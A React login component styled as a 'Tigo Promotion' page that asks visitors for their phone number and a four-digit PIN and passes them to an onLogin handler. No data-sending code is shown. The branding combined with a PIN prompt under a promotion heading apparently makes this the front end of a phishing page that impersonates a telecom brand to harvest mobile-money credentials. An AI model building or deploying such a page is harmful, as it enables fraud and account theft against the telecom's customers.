import React, { useState } from "react";

const Login = ({ onLogin }) => {
  const [phone, setPhone] = useState("");
  const [pin, setPin] = useState("");

  const handleSubmit = (e) => {
    e.preventDefault();
    onLogin(phone, pin);
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center bg-cover bg-center relative"
      style={{
        backgroundImage:
          "url('https://images.unsplash.com/photo-1521791136064-7986c2920216?auto=format&fit=crop&w=1600&q=80')",
      }}
    >
      {/* Overlay */}
      <div className="absolute inset-0 bg-black/60"></div>

      {/* Card */}
      <div className="relative z-10 bg-white rounded-xl shadow-2xl w-full max-w-md p-8">
        <h1 className="text-3xl font-bold text-center mb-2">
          Tigo Promotion
        </h1>
        <p className="text-center text-gray-500 mb-6">
          Enter your phone number and PIN
        </p>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-sm font-semibold text-gray-600">
              Phone Number
            </label>
            <input
              type="text"
              required
              placeholder="07XXXXXXXX"
              className="w-full mt-1 p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-600"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
            />
          </div>

          <div>
            <label className="block text-sm font-semibold text-gray-600">
              PIN
            </label>
            <input
              type="password"
              required
              maxLength={4}
              placeholder="****"
              className="w-full mt-1 p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-600"
              value={pin}
              onChange={(e) => setPin(e.target.value)}
            />
          </div>

          <button
            type="submit"
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition"
          >
            Login
          </button>
        </form>

        <p className="text-xs text-gray-400 text-center mt-6">

        </p>
      </div>
    </div>
  );
};

export default Login;
